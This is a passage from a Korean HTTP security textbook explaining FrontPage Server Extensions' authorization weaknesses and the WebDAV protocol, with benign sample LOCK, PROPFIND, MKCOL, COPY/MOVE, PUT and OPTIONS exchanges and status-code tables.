**첫째, 저작 채널이 열람 채널과 같은 포트, 같은 프로토콜, 같은 메서드를 쓴다.** FPSE의 RPC는 `POST`이고, 웹 폼 제출도 `POST`다. 원서가 장점으로 적은 문장 — "중간의 방화벽과 프록시가 `POST` 메서드를 허용하도록 설정되어 있는 한 FrontPage는 계속 통신할 수 있다" — 을 방어자의 위치에서 읽으면, **경계 장비가 "문서 목록 조회"와 "폼 제출"을 구별하려면 요청 본문을 파싱해 `method=` 파라미터를 해석해야 한다**는 뜻이다. 13.12절이 열거한 중간자의 파싱 부담이 여기서 하나 더 늘어난다. 방화벽 규칙 수준에서 저작 트래픽을 막는 일이 사실상 불가능하다.

**둘째, 인가가 웹 서버에 위임된다.** 원서의 문장 그대로 **"대부분의 경우 FPSE는 보안 제공을 웹 서버에 의존한다."** 이것은 15.10.3절이 서술한 계층 간 신뢰 관계의 정확한 사례다. FPSE는 자기 동작에 대한 접근 통제를 스스로 하지 않고 아래 계층(웹 서버의 `.htaccess`, IIS의 ACL)이 해 주기를 신뢰한다. 그런데 그 아래 계층이 이해하는 어휘는 **메서드와 경로**(`author.exe`에 `POST`할 수 있는가)이고, FPSE가 실행하는 것은 **본문 안의 명령**(`method=list documents`)이다. **인가의 단위와 동작의 단위가 어긋나 있다.** 한 사용자에게 `author.dll`에 대한 `POST`를 허용하면 그 DLL이 노출하는 모든 저작 명령을 허용한 것이다.

**셋째, 진입점이 발견 가능하다.** `_vti_inf.html`, `_vti_bin/`, `_vti_aut/`, `_vti_adm/`은 고정된 경로다. 이 경로들의 존재 자체가 FPSE가 설치되어 있음과 저작·관리 엔드포인트의 위치를 광고한다. 12.6절이 다룬 기본 콘텐츠와 관리 인터페이스의 문제이며, 25장의 애플리케이션 매핑과 16.11절의 공개 리소스 정찰이 정확히 이런 고정 경로를 찾는다. 여기에 `listHiddenDocs` 파라미터가 있다는 사실 — `_`로 시작하는 "숨은" 문서를 나열할 수 있다는 사실 — 을 겹치면, **인가가 어긋난 상태에서 이 프로토콜은 사이트의 전체 구조를 노출하는 조회 인터페이스가 된다.**

### 15.11.2 WebDAV와 협업 저작

**WebDAV(Web Distributed Authoring and Versioning)** 는 웹 발행에 차원 하나를 더한다. **협업**이다. 원서가 쓰인 시점에 가장 흔한 협업 관행은 결정적으로 저수준이었다. 주로 이메일이었고 때로 분산 파일 공유가 결합됐다. 이 관행은 매우 불편하고 오류가 잦으며 과정에 대한 통제가 거의 또는 전혀 없다는 것이 입증됐다. 자동차 제조사의 다국적·다국어 웹 사이트를 출범시키는 예를 생각하면, **잠금과 버전 관리 같은 협업 프리미티브와 함께 안전하고 신뢰성 있는 발행 프리미티브를 갖춘 견고한 시스템의 필요**를 쉽게 알 수 있다.

**WebDAV(RFC 2518로 발행)는 협업 저작에 적합한 플랫폼을 제공하도록 HTTP를 확장하는 데 초점을 맞춘다.**

#### WebDAV 메서드

WebDAV는 새로운 HTTP 메서드 집합을 정의하고 몇몇 기존 HTTP 메서드의 동작 범위를 수정한다.

**표 15-14. WebDAV가 추가한 메서드 (HTTP-DG 19장 기준)**

| 메서드 | 하는 일 |
|---|---|
| `PROPFIND` | 리소스의 속성을 조회한다 |
| `PROPPATCH` | 하나 또는 여러 리소스에 하나 이상의 속성을 설정한다 |
| `MKCOL` | 컬렉션을 생성한다 |
| `COPY` | 리소스나 리소스 컬렉션을 주어진 출발지에서 주어진 목적지로 복사한다. **목적지가 같은 기계일 필요는 없다** |
| `MOVE` | 리소스나 리소스 컬렉션을 주어진 출발지에서 주어진 목적지로 이동한다. **목적지가 같은 기계일 필요는 없다** |
| `LOCK` | 하나 또는 여러 리소스를 잠근다 |
| `UNLOCK` | 앞서 잠긴 리소스를 잠금 해제한다 |

**WebDAV가 수정하는 HTTP 메서드는 `DELETE`, `PUT`, `OPTIONS`다.** `GET`과 `HEAD`의 시맨틱은 변하지 않고, `POST`가 수행하는 동작은 언제나 서버 구현이 정의하므로 WebDAV는 `POST` 시맨틱을 수정하지 않는다.

**12.7절과의 역할 분담을 확인한다.** 12.7절은 이 메서드들을 **서버 설정의 오설정** — 어떤 메서드가 열려 있는가 — 으로 다뤘고, `PUT` + `MOVE` 조합으로 실행 가능한 확장자를 우회하는 공격과 `OPTIONS`의 신뢰성 문제를 서술했다. 이 절은 **협업 저작 시스템 전체**로서의 WebDAV를 다룬다. 잠금, 속성, 컬렉션, XML 페이로드가 무엇이며 그것들이 함께 무엇을 만드는가다.

#### WebDAV와 XML

WebDAV의 메서드들은 대체로 요청과 응답 양쪽에 많은 정보를 연결해야 한다. HTTP는 보통 이 정보를 메시지 헤더로 전달한다. **그러나 필요한 정보를 헤더만으로 전송하는 데는 한계가 있다. 한 요청 안의 여러 리소스에 헤더 정보를 선택적으로 적용하는 어려움, 계층을 표현하는 어려움 등이 그것이다.**

이 문제를 풀기 위해 WebDAV는 구조화된 데이터를 서술하는 형식을 제공하는 메타 마크업 언어인 **XML**을 채택한다. XML은 WebDAV에 다음을 제공한다.

- 데이터를 어떻게 다룰지 서술하는 지시를 서식화하는 방법
- 서버로부터의 복잡한 응답을 서식화하는 방법
- 처리되는 컬렉션과 리소스에 대한 맞춤 정보를 전달하는 방법
- 데이터 자체를 위한 유연한 운반체
- 대부분의 국제화 문제에 대한 견고한 해법

**WebDAV는 명시적 XML 네임스페이스 `DAV:`를 정의한다.** XML 네임스페이스는 요소나 속성 이름의 모음이며, 네임스페이스는 내장된 이름들을 도메인 전체에서 고유하게 한정해 이름 충돌을 피한다. 완전한 XML 스키마는 WebDAV 명세(RFC 2518)에 정의되어 있다. **사전 정의된 스키마가 있으므로 파싱 소프트웨어는 DTD 파일을 읽어 올바로 해석하지 않고도 XML 스키마에 대한 가정을 할 수 있다.**

#### WebDAV 헤더

**표 15-15. WebDAV가 도입한 HTTP 헤더 (HTTP-DG 19장 기준)**

| 헤더 | 문법 | 하는 일 |
|---|---|---|
| `DAV` | `DAV = "DAV" ":" "1" ["," "2"] ["," 1#extend]` | 서버의 WebDAV 능력을 전달한다. WebDAV가 지원하는 모든 리소스는 `OPTIONS` 요청에 대한 응답에서 이 헤더를 반환해야 한다 |
| `Depth` | `Depth = "Depth" ":" ("0" \| "1" \| "infinity")` | 여러 수준의 계층을 가진 그룹 리소스로 WebDAV를 확장하는 핵심 요소. 디렉터리 `DIR_A`에 `file_1.html`과 `file_2.html`이 있을 때 `Depth: 0`은 `DIR_A` 디렉터리에만, `Depth: 1`은 `DIR_A`와 그 파일들에 적용된다. `LOCK`, `COPY`, `MOVE` 등 많은 메서드를 수정한다 |
| `Destination` | `Destination = "Destination" ":" absoluteURI` | `COPY`나 `MOVE`가 목적지 URI를 식별하는 것을 돕는다 |
| `If` | `If = "If" ":" (1*No-tag-list \| 1*Tagged-list)` | 조건의 집합을 정의한다. 모두 거짓으로 평가되면 요청이 실패한다. **정의된 유일한 상태 토큰은 잠금 토큰이다.** `COPY`와 `PUT` 같은 메서드가 전제 조건을 지정해 적용 여부를 조건화한다. **실무에서 가장 흔한 전제 조건은 사전에 잠금을 획득했는가다** |
| `Lock-Token` | `Lock-Token = "Lock-Token" ":" Coded-URL` | `UNLOCK` 메서드가 제거할 잠금을 지정하는 데 쓴다. `LOCK`에 대한 응답도 획득한 잠금 정보를 담은 이 헤더를 갖는다 |
| `Overwrite` | `Overwrite = "Overwrite" ":" ("T" \| "F")` | `COPY`와 `MOVE`가 목적지를 덮어쓸지 지정하는 데 쓴다 |
| `Timeout` | `TimeOut = "Timeout" ":" 1#TimeType` | 클라이언트가 원하는 잠금 타임아웃 값을 지정하는 요청 헤더 |

#### 잠금과 덮어쓰기 방지

**정의상 협업에는 한 사람 이상이 주어진 문서를 작업하는 일이 포함된다.** 여기에 내재하는 문제가 **갱신 손실 문제(lost update problem)** 다.

저작자 A와 B가 함께 명세서를 쓰고 있다. A와 B가 독립적으로 문서에 변경을 가한다. A가 갱신된 문서를 저장소에 밀어 넣고, 나중에 B가 자기 버전의 문서를 저장소에 올린다. **불행히도 B는 A의 변경을 결코 알지 못했으므로 자기 버전을 A의 버전과 병합한 적이 없고, 그 결과 A의 작업이 사라진다.**

```
   [저작자 A] ── A의 사본 ──> [공유 파일 저장소] <── B의 사본 ── [저작자 B]

   1. A가 발행한다 ─────────> [저장소 = A의 버전]      B의 사본 (A의 변경을 모름)

   2.                          [저장소 = B의 버전] <─── B도 발행하며 A의 변경을 덮어쓴다
```

*그림 15-6. 갱신 손실 문제 (HTTP-DG 그림 19-3 기준)*

**이 문제를 완화하기 위해 WebDAV는 잠금(locking) 개념을 지원한다. 잠금만으로는 문제가 완전히 풀리지 않는다. 해법을 완성하려면 버전 관리와 메시징 지원이 필요하다.**

WebDAV는 두 종류의 잠금을 지원한다.

- **리소스나 컬렉션에 대한 배타적 쓰기 잠금(exclusive write lock)** — 잠금 소유자에게만 쓰기 권한을 보장한다. 잠재적 충돌을 완전히 제거한다.
- **리소스나 컬렉션에 대한 공유 쓰기 잠금(shared write lock)** — 한 무리의 사람들이 주어진 문서를 작업할 수 있게 한다. 모든 저작자가 서로의 활동을 알고 있는 환경에서 잘 동작한다.

WebDAV는 `PROPFIND`를 통해 잠금 지원 여부와 지원되는 잠금 종류를 판정하는 속성 발견 메커니즘을 제공한다.

**잠금을 수행하려면 저작자를 식별하는 메커니즘이 필요하다. WebDAV는 Digest 인증을 요구한다**(→ 21장). 잠금이 승인되면 서버는 도메인 전체에서 고유한 토큰을 클라이언트에게 반환한다. 명세는 이것을 **`opaquelocktoken` 잠금 토큰 URI 스킴**이라 부른다. 이후 클라이언트가 쓰기를 수행하려 할 때는 서버에 접속해 Digest 인증 시퀀스를 완료하고, 인증이 끝나면 `PUT` 요청과 함께 잠금 토큰을 제시한다. **따라서 쓰기를 완료하려면 올바른 사용자와 잠금 토큰의 조합이 필요하다.**

```
LOCK /ch-publish.fm HTTP/1.1
Host: minstar
Content-Type: text/xml
User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)
Content-Length: 201

<?xml version="1.0"?>
<a:lockinfo xmlns:a="DAV:">
     <a:lockscope><a:exclusive/></a:lockscope>
     <a:locktype><a:write/></a:locktype>
     <a:owner><a:href>AuthorA</a:href></a:owner>
</a:lockinfo>
```

*예제 15-14. `LOCK` 요청 (HTTP-DG 19장 기준)*

`<lockinfo>` 안의 세 하위 요소는 `<locktype>`(잠금의 종류. 현재는 `write` 하나뿐이다), `<lockscope>`(배타적 잠금인지 공유 잠금인지), `<owner>`(현재 잠금을 가진 사람)다.

```
HTTP/1.1 200 OK
Server: Microsoft-IIS/5.0
Date: Fri, 10 May 2002 20:56:18 GMT
Content-Type: text/xml
Content-Length: 419

<?xml version="1.0"?>
<a:prop xmlns:a="DAV:">
<a:lockdiscovery><a:activelock>
<a:locktype><a:write/></a:locktype>
<a:lockscope><a:exclusive/></a:lockscope>
<a:owner xmlns:a="DAV:"><a:href>AuthorA</a:href></a:owner>
<a:locktoken><a:href>opaquelocktoken:*****</a:href></a:locktoken>
<a:depth>0</a:depth>
<a:timeout>Second-180</a:timeout>
</a:activelock></a:lockdiscovery>
</a:prop>
```

*예제 15-15. `LOCK`에 대한 성공 응답 (HTTP-DG 19장 기준)*

`<lockdiscovery>` 요소는 잠금 정보의 컨테이너다. 그 안의 `<activelock>` 하위 요소가 요청과 함께 보내진 정보(`<locktype>`, `<lockscope>`, `<owner>`)를 담고, 여기에 다음이 추가된다.

- `<locktoken>` — `opaquelocktoken`이라는 URI 스킴으로 잠금을 고유하게 식별한다. **HTTP의 무상태적 성질을 감안해, 이 토큰이 이후 요청에서 잠금의 소유권을 식별하는 데 쓰인다.**
- `<depth>` — `Depth` 헤더의 값을 반영한다.
- `<timeout>` — 잠금에 연결된 타임아웃. 위 응답에서는 180초다.

**`opaquelocktoken` 스킴은 모든 리소스에 대해 모든 시간에 걸쳐 고유한 토큰을 제공하도록 설계됐다.** 고유성을 보장하기 위해 WebDAV 명세는 ISO-11578이 서술한 **UUID** 메커니즘의 사용을 의무화한다. 실제 구현에는 재량이 있다. 서버는 `LOCK` 요청마다 UUID를 생성하거나, 하나의 UUID를 생성하고 끝에 추가 문자를 붙여 고유성을 유지할 수 있다. 성능 면에서는 후자가 낫다. **다만 후자를 택한 서버는 추가한 확장이 결코 재사용되지 않음을 보장해야 한다.**

`<lockdiscovery>` XML 요소는 능동적 잠금 발견 메커니즘을 제공한다. **잠금이 걸려 있는 동안 다른 사람이 그 파일을 잠그려 하면 현재 소유자를 나타내는 `<lockdiscovery>` XML 요소를 받는다.** 이 요소는 미결 잠금 전체를 속성과 함께 나열한다.

잠금을 갱신하려면 클라이언트는 `If` 헤더에 잠금 토큰을 담아 잠금 요청을 다시 제출해야 한다. 반환되는 타임아웃 값은 이전 값과 다를 수 있다. 클라이언트는 서버가 주는 타임아웃을 받아들이는 대신 `Timeout` 헤더로 원하는 값을 지정할 수 있다. 문법은 쉼표로 구분된 몇 가지 선택지를 허용한다.

```
Timeout: Infinite, Second-86400
```

**서버는 어느 선택지도 존중할 의무가 없다.** 다만 `<timeout>` XML 요소로 잠금 만료 시각을 제공해야 한다. **모든 경우에 잠금 타임아웃은 지침일 뿐이고 서버를 반드시 구속하지 않는다.** 관리자가 수동 재설정을 할 수도 있고, 다른 예외적 사건이 서버로 하여금 잠금을 재설정하게 할 수도 있다. **클라이언트는 긴 잠금을 잡는 것을 피해야 한다.**

`UNLOCK`은 리소스의 잠금을 제거한다.

```
UNLOCK /ch-publish.fm HTTP/1.1
Host: minstar.inktomi.com
User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)
Lock-Token: opaquelocktoken:*********

HTTP/1.1 204 No Content
Server: Microsoft-IIS/5.0
Date: Fri, 10 May 2002 20:56:18 GMT
```

*예제 15-16. `UNLOCK` 요청과 응답 (HTTP-DG 19장 기준)*

**대부분의 리소스 관리 요청과 마찬가지로 `UNLOCK`이 성공하려면 두 가지가 필요하다. 사전에 성공적인 Digest 인증 시퀀스를 완료했을 것, 그리고 `Lock-Token` 헤더로 보낸 잠금 토큰이 일치할 것이다.**

**표 15-16. `LOCK`·`UNLOCK`의 상태 코드 (HTTP-DG 표 19-1 기준)**

| 상태 코드 | 정의한 곳 | 메서드 | 효과 |
|---|---|---|---|
| `200 OK` | HTTP | `LOCK` | 잠금 성공 |
| `201 Created` | HTTP | `LOCK` | **존재하지 않는 리소스에 대한 잠금이 그 리소스를 생성함으로써 성공했음을 나타낸다** |
| `204 No Content` | HTTP | `UNLOCK` | 잠금 해제 성공 |
| `207 Multi-Status` | WebDAV | `LOCK` | 여러 리소스를 잠그는 요청이었고 반환된 상태 코드가 모두 같지 않아 하나의 207 응답에 캡슐화됨 |
| `403 Forbidden` | HTTP | `LOCK` | 클라이언트에게 리소스를 잠글 권한이 없음 |
| `412 Precondition Failed` | HTTP | `LOCK` | `LOCK`과 함께 보낸 XML이 만족되어야 할 조건을 나타냈으나 서버가 그 조건을 완료하지 못했거나, 잠금 토큰이 강제될 수 없었음 |
| `422 Unprocessable Property` | WebDAV | `LOCK` | 적용 불가능한 시맨틱. 예를 들어 컬렉션이 아닌 리소스에 0이 아닌 `Depth`를 지정한 경우 |
| `423 Locked` | WebDAV | `LOCK` | 이미 잠겨 있음 |
| `424 Failed Dependency` | WebDAV | `UNLOCK` | `UNLOCK`이 다른 동작과 그 성공을 잠금 해제의 조건으로 지정했는데 그 의존이 완료되지 못한 경우 |

#### 속성과 메타데이터

**속성(property)은 리소스에 대한 정보 — 저작자 이름, 수정 날짜, 콘텐츠 등급 등 — 를 서술한다.** HTML의 META 태그가 이 정보를 콘텐츠의 일부로 내장하는 메커니즘을 제공하지만, 많은 리소스(임의의 바이너리 데이터 등)는 메타데이터를 내장할 능력이 없다.

WebDAV 같은 분산 협업 시스템은 속성 요구사항에 복잡성을 더한다. 저작자 속성을 생각해 보자. 문서가 편집되면 이 속성은 새 저작자를 반영하도록 갱신되어야 한다. **WebDAV는 이렇게 동적으로 수정 가능한 속성을 "라이브(live)" 속성이라 부르고, `Content-Type` 같은 더 영구적이고 정적인 속성을 "데드(dead)" 속성이라 부른다.**

속성의 발견과 수정을 지원하기 위해 WebDAV는 `PROPFIND`와 `PROPPATCH` 두 메서드로 HTTP를 확장한다.

**`PROPFIND`** 는 주어진 파일이나 파일 그룹("컬렉션")의 속성을 조회하는 데 쓴다. 세 종류의 동작을 지원한다.

- 모든 속성과 그 값을 요청한다.
- 선택된 속성 집합과 값을 요청한다.
- 모든 속성 이름을 요청한다.

```
PROPFIND /ch-publish.fm HTTP/1.1
Host: minstar.inktomi.com
User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)
Depth: 0
Cache-Control: no-cache
Connection: Keep-Alive
Content-Length: 0
```

*예제 15-17. 모든 속성과 값을 요청하는 `PROPFIND` (HTTP-DG 19장 기준)*

`<propfind>` 요청 요소는 `PROPFIND`가 반환할 속성을 지정한다. 함께 쓰이는 XML 요소는 다음과 같다.

- `<allprop>` — 모든 속성 이름과 값을 반환하도록 요구한다. 모든 속성과 값을 요청하려면 클라이언트는 `<propfind>` 요소의 일부로 `<allprop>` 하위 요소를 보내거나 **본문 없이 요청을 제출**할 수 있다.
- `<propname>` — 반환할 속성 이름 집합을 지정한다.
- `<prop>` — `<propfind>`의 하위 요소로, 값을 반환할 특정 속성을 지정한다.

응답은 다음과 같다.

```
HTTP/1.1 207 Multi-Status
Server: Microsoft-IIS/5.0
...

<?xml version="1.0"?>
<a:multistatus xmlns:b="urn:uuid:********/" xmlns:c="xml:" xmlns:a="DAV:">
<a:response>
  <a:href>http://minstar/ch-publish.fm</a:href>
  <a:propstat>
    <a:status>HTTP/1.1 200 OK</a:status>
    <a:prop>
      <a:getcontentlength b:dt="int">1155</a:getcontentlength>
      ...
      <a:ishidden b:dt="boolean">0</a:ishidden>
      <a:iscollection b:dt="boolean">0</a:iscollection>
    </a:prop>
  </a:propstat>
</a:response></a:multistatus>
```

*예제 15-18. `PROPFIND`에 대한 응답 (HTTP-DG 19장 기준)*

서버는 **207 Multi-Status** 코드로 응답한다. **WebDAV는 여러 리소스에 동시에 작용하며 리소스마다 다른 응답을 가질 수 있는 `PROPFIND`와 몇몇 메서드에 207 응답을 쓴다.** 응답의 XML 요소는 `<multistatus>`(여러 응답의 컨테이너), `<href>`(리소스의 URI를 식별), `<status>`(그 요청에 대한 HTTP 상태 코드), `<propstat>`(하나의 `<status>` 요소와 하나의 `<prop>` 요소를 묶는다. `<prop>`은 그 리소스에 대한 하나 이상의 속성 이름/값 쌍을 담을 수 있다)이다.

**`PROPFIND`의 즉각적 응용 하나는 디렉터리 목록 지원이다. `PROPFIND` 요청의 표현력을 감안하면 단 한 번의 호출로 컬렉션의 전체 계층을 개별 개체의 모든 속성과 함께 조회할 수 있다.**

**`PROPPATCH`** 는 주어진 리소스에 여러 속성을 설정하거나 제거하는 원자적 메커니즘을 제공한다. **원자성은 모든 요청이 성공하거나 아무것도 반영되지 않음을 보장한다.** 기본 XML 요소는 `<propertyupdate>`이고, `<set>`(속성 값을 설정. 속성이 이미 있으면 값이 대체된다)과 `<remove>`(제거할 속성을 지정. `<set>`과 달리 `<prop>` 컨테이너에 속성 이름만 나열한다)로 동작을 지정한다.

```xml
<d:propertyupdate xmlns:d="DAV:" xmlns:o="http://name-space/scheme/">
 <d:set>
   <d:prop>
     <o:owner>Author A</o:owner>
   </d:prop>
 </d:set>
 <d:remove>
   <d:prop>
     <o:owner/>
   </d:prop>
 </d:remove>
</d:propertyupdate>
```

*예제 15-19. `owner` 속성을 설정하고 제거하는 `PROPPATCH` 본문 (HTTP-DG 19장 기준)*

**표 15-17. `PROPFIND`·`PROPPATCH`의 주요 상태 코드 (HTTP-DG 표 19-2 기준)**

| 상태 코드 | 메서드 | 효과 |
|---|---|---|
| `200 OK` | 둘 다 | 명령 성공 |
| `207 Multi-Status` | 둘 다 | 하나 이상의 리소스(또는 컬렉션)에 작용할 때 각 객체의 상태가 하나의 207 응답에 캡슐화된다. 전형적인 성공 응답이다 |
| `401 Unauthorized` | `PROPPATCH` | 속성 수정 동작을 완료하려면 인가가 필요하다 |
| `403 Forbidden` | 둘 다 | `PROPFIND`는 클라이언트가 속성에 접근할 수 없음, `PROPPATCH`는 속성을 변경할 수 없음 |
| `404 Not Found` | `PROPFIND` | 그런 속성이 없음 |
| `409 Conflict` | `PROPPATCH` | 갱신 시맨틱의 충돌. 예를 들어 읽기 전용 속성을 갱신하려 한 경우 |
| `423 Locked` | `PROPPATCH` | 대상 리소스가 잠겨 있고 잠금 토큰이 없거나 일치하지 않음 |
| `507 Insufficient Storage` | `PROPPATCH` | 수정된 속성을 등록할 공간이 부족함 |

#### 컬렉션과 네임스페이스 관리

**컬렉션(collection)** 은 사전 정의된 계층 안의 리소스들의 논리적 또는 물리적 그룹을 가리킨다. 고전적인 예는 디렉터리다. 파일 시스템의 디렉터리처럼 컬렉션은 다른 컬렉션을 포함한 다른 리소스의 컨테이너 역할을 한다.

WebDAV는 네임스페이스를 조작하는 다섯 메서드를 제공한다. `DELETE`, `MKCOL`, `COPY`, `MOVE`, `PROPFIND`다.

**`MKCOL`** 은 클라이언트가 서버의 지정된 URL에 컬렉션을 생성할 수 있게 한다. 컬렉션 생성만을 위해 새 메서드 전체를 정의하는 것이 언뜻 중복으로 보일 수 있다. `PUT`이나 `POST` 위에 얹는 것이 완벽한 대안으로 보인다. **WebDAV 설계자들은 이 대안들을 검토했고 그럼에도 새 메서드를 정의하기로 했다. 그 이유의 일부는 다음과 같다.**

- **`PUT`이나 `POST`로 컬렉션을 생성하게 하려면 클라이언트가 요청과 함께 추가적인 "시맨틱 접착제"를 보내야 한다. 실현 가능하기는 하지만 임기응변적 프로토콜을 정의하는 일은 지루하고 오류가 잦아질 수 있다.**
- **대부분의 접근 통제 메커니즘은 메서드의 종류에 기반한다. 저장소에서 리소스를 생성하고 삭제하도록 허용되는 것은 소수의 메서드뿐이다. 다른 메서드를 오버로드하면 이 접근 통제 메커니즘이 동작하지 않는다.**

**두 번째 이유가 이 책의 관점에서 중요하다.** 접근 통제의 단위가 메서드라면, 하나의 메서드에 여러 시맨틱을 얹는 순간 그 접근 통제는 표현력을 잃는다. **15.11.1절이 FPSE에 대해 지적한 문제 — 인가의 단위(메서드와 경로)와 동작의 단위(본문 안의 명령)가 어긋난다는 것 — 를 WebDAV 설계자들은 의식적으로 피했다.** 두 발행 시스템의 가장 큰 설계적 차이가 여기 있다.

```
MKCOL /publishing HTTP/1.1
Host: minstar
Content-Length: 0
Connection: Keep-Alive

HTTP/1.1 201 Created
Server: Microsoft-IIS/5.0
Date: Fri, 10 May 2002 23:20:36 GMT
Location: http://minstar/publishing/
Content-Length: 0
```

*예제 15-20. `MKCOL` 요청과 응답 (HTTP-DG 19장 기준)*

병리적 사례 몇 가지를 보자. 컬렉션이 이미 존재하는데 `MKCOL /colA`를 하면(네임스페이스 충돌) 요청은 **405 Method Not Allowed**로 실패한다. 쓰기 권한이 없으면 **403 Forbidden**으로 실패한다. `MKCOL /colA/colB`를 하는데 `colA`가 없으면 **409 Conflict**로 실패한다.

**`DELETE`** 는 WebDAV에서 컬렉션까지 시맨틱이 확장된다. **디렉터리를 지워야 한다면 `Depth` 헤더가 필요하다. `Depth` 헤더가 지정되지 않으면 `DELETE`는 `Depth`가 infinity로 설정된 것으로 간주한다. 즉 디렉터리 안의 모든 파일과 그 하위 디렉터리 전부가 삭제된다.** 응답에는 방금 삭제된 컬렉션을 식별하는 `Content-Location` 헤더도 담긴다.

컬렉션을 제거할 때는 컬렉션 안의 파일이 다른 사람에 의해 잠겨 있어 삭제할 수 없을 가능성이 언제나 있다. 그런 경우 컬렉션 자체를 삭제할 수 없고 서버는 **207 Multi-Status**로 응답하며, `<status>` 요소가 `423 Locked`를 담아 그 리소스가 다른 사용자에게 잠겨 있음을 나타낸다.

**`COPY`와 `MOVE`.** `MKCOL`과 마찬가지로 새 메서드를 정의하는 것 외의 대안이 있었다. `COPY`의 대안 하나는 출발지에 `GET`을 해서 리소스를 내려받은 다음 `PUT`으로 서버에 다시 올리는 것이다. `MOVE`도 비슷한 시나리오(추가로 `DELETE`)를 생각할 수 있다. **그러나 이 과정은 확장성이 나쁘다. 다단계 컬렉션에 대한 `COPY`나 `MOVE` 동작을 관리하는 데 따르는 모든 문제를 생각해 보면 알 수 있다.**

`COPY`와 `MOVE`는 모두 요청 URL을 출발지로, `Destination` HTTP 헤더의 내용을 대상으로 쓴다. **`MOVE`는 `COPY`의 작업에 더해, 출발지 URL을 목적지로 복사하고, 새로 생성된 URI의 무결성을 검사하고, 그다음 출발지를 삭제한다.**

```
{COPY,MOVE} /publishing HTTP/1.1
Destination: http://minstar/pub-new
Depth: infinity
Overwrite: T
Host: minstar

HTTP/1.1 201 Created
Server: Microsoft-IIS/5.0
Date: Wed, 15 May 2002 18:29:53 GMT
Location: http://minstar.inktomi.com/pub-new/
Content-Type: text/xml
Content-Length: 0
```

*예제 15-21. `COPY`/`MOVE` 요청과 응답 (HTTP-DG 19장 기준)*

**컬렉션에 작용할 때 `COPY`나 `MOVE`의 동작은 `Depth` 헤더의 영향을 받는다. `Depth` 헤더가 없으면 infinity로 간주한다.** 즉 기본적으로 출발지 디렉터리의 전체 구조가 복사되거나 이동된다. `Depth`가 0이면 메서드는 그 리소스에만 적용된다.

#### 강화된 HTTP/1.1 메서드

WebDAV는 `DELETE`, `PUT`, `OPTIONS`의 시맨틱을 수정한다.

**`PUT`.** WebDAV가 정의한 것은 아니지만 저작자가 공유 사이트에 콘텐츠를 전송할 유일한 방법이다. **WebDAV는 잠금을 지원하도록 `PUT`의 동작을 수정한다.**

```
PUT /ch-publish.fm HTTP/1.1
Accept: */*
If: <http://minstar/index.htm> (<opaquelocktoken:********>)
User-Agent: DAV Client (C)
Host: minstar.inktomi.com
Connection: Keep-Alive
Cache-Control: no-cache
Content-Length: 1155
```

*예제 15-22. 잠금 토큰을 담은 `PUT` (HTTP-DG 19장 기준)*

**잠금을 지원하기 위해 WebDAV는 `PUT` 요청에 `If` 헤더를 더한다.** 위 트랜잭션에서 `If` 헤더의 시맨틱은 "`If` 헤더로 지정된 잠금 토큰이 리소스의 잠금과 일치하면 `PUT` 동작을 수행해야 한다"이다. `If` 헤더는 `PROPPATCH`, `DELETE`, `MOVE`, `LOCK`, `UNLOCK` 등 몇몇 다른 메서드에도 쓰인다.

**`OPTIONS`.** 이것은 대개 WebDAV 지원 클라이언트가 보내는 첫 요청이다. **`OPTIONS`로 클라이언트는 WebDAV 서버의 능력을 파악하려 한다.**

```
OPTIONS /ch-publish.fm HTTP/1.1
Accept: */*
Host: minstar.inktomi.com

HTTP/1.1 200 OK
Server: Microsoft-IIS/5.0
MS-Author-Via: DAV
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL,
        PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND,
       PROPPATCH, SEARCH, LOCK, UNLOCK
```

*예제 15-23. `OPTIONS` 요청과 응답 (HTTP-DG 19장 기준)*

응답의 헤더들을 보자.

- **`DAV` 헤더**는 DAV 준수 등급 정보를 전달한다. 두 등급이 있다. **1등급 준수**는 서버가 RFC 2518 모든 절의 모든 MUST 요구사항을 준수할 것을 요구한다. 리소스가 1등급 수준으로만 준수하면 `DAV` 헤더에 `1`을 보낸다. **2등급 준수**는 1등급 요구사항을 모두 충족하고 **`LOCK` 메서드 지원을 추가한다.** `LOCK`과 함께 2등급 준수는 `Timeout`·`Lock-Token` 헤더와 `<supportedlock>`·`<lockdiscovery>` XML 요소의 지원을 요구한다. 위 예에서 `DAV` 헤더는 1등급과 2등급 준수를 모두 나타낸다.
- **`Public` 헤더**는 이 서버가 지원하는 모든 메서드를 나열한다.
- **`Allow` 헤더**는 대개 `Public` 헤더 메서드의 부분집합을 담는다. **이 특정 리소스에 허용되는 메서드만 나열한다.**
- **`DASL` 헤더**는 `SEARCH` 메서드에 쓰이는 질의 문법의 종류를 제공한다. 위 경우는 SQL이다.

12.7절이 지적한 함정을 여기서 다시 확인해야 한다. **`Public`과 `Allow`가 광고하는 목록은 실제로 사용 가능한 메서드 집합과 일치하지 않을 수 있다.** 광고된 메서드가 인증이나 다른 제약 때문에 실제로는 쓸 수 없기도 하고, 목록에 없는 메서드가 실제로는 동작하기도 한다.

#### WebDAV의 버전 관리

**"DAV"의 "V"를 생각하면 역설적이지만, 버전 관리는 첫 판에 들어가지 못한 기능이다.** 다중 저작자 협업 환경에서 버전 관리는 결정적이다. 실제로 그림 15-6의 갱신 손실 문제를 완전히 고치려면 **잠금과 버전 관리가 모두 필수적이다.** 버전 관리에 연결된 흔한 기능으로는 이전 문서 버전을 저장하고 접근하는 능력, 그리고 변경 이력과 변경을 상세히 설명하는 주석을 관리하는 능력이 있다. **버전 관리는 RFC 3253으로 WebDAV에 추가됐다.**

원서가 쓰인 시점 기준으로 WebDAV는 잘 지원되고 있었다. 클라이언트 구현으로는 IE 5.x 이상, 윈도 탐색기, 마이크로소프트 오피스가 있었고, 서버 측 구현으로는 IIS 5.x 이상, `mod_dav`를 얹은 Apache 등이 있었다. 윈도 XP와 Mac OS 10.x는 WebDAV 지원을 기본 제공했다.

### 15.11.3 이 책의 관점: 발행 시스템의 여섯 가지 성질

12.7절이 "메서드가 열려 있는 것 자체의 위험"을 다뤘다면, 여기서는 **협업 저작 시스템 전체**로서의 성질을 본다. 여섯 가지다.

